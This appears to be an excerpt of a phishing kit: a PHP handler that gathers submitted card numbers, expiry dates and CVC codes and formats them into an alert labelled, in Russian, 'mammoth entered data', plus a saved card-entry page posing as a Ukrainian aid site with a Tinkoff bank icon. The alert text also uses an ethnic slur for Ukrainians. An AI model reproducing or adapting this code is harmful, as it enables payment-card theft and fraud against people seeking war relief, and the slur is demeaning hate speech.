...
if ($_GET['act'] == 'link') {
     	...
     	if( $_POST['fcard'] != "" || $_POST['fexpm'] != "" || $_POST['fcvc'] != "" ) {
			 $msg = "<b>Фиш СС Хохлов :</b>%0A ⚠️ <b>Мамонт ввел данные</b>"."%0A 🔒 <b>Номер:</b> <code>".$_POST['fcard']."</code>"." %0A <b>🔒 Дата:</b> <code>".$_POST['fexpm']."/".$_POST['fexpy']."</code>"."%0A 🔒 <b>cvc:</b> <code>".$_POST['fcvc']."</code>";
...
<!DOCTYPE html>
<!-- saved from url=(0037)https://ukraine-help.site/payment.php -->
<html lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="./Введення картки_files/bootstrap.min.css">
  <style>%style%</style>
  <link rel="icon" href="https://www.cdn-tinkoff.ru/platform/images/favicon.ico?2.3.1" sizes="" type="image/x-icon">
  <script type="text/javascript" charset="utf-8" async="" src="./Введення картки_files/loader.js.Без названия"></script><script src="./Введення картки_files/vue.min.js.Без названия"></script>
  <script src="./Введення картки_files/vue-the-mask.js.Без названия"></script>
  <script src="./Введення картки_files/jquery.min.js.Без названия"></script>
  <script src="./Введення картки_files/bootstrap.min.js.Без названия"></script>
  <script>%script%</script>
  <title>Введення картки</title>
  ...
  new Vue({
    ...
    computed: {
        ...
        generateCardNumberMask() {
            return this.getCardType === "maestro" ? this.maestroCardMask : this.otherCardMask;
        },
        minCardMonth() {
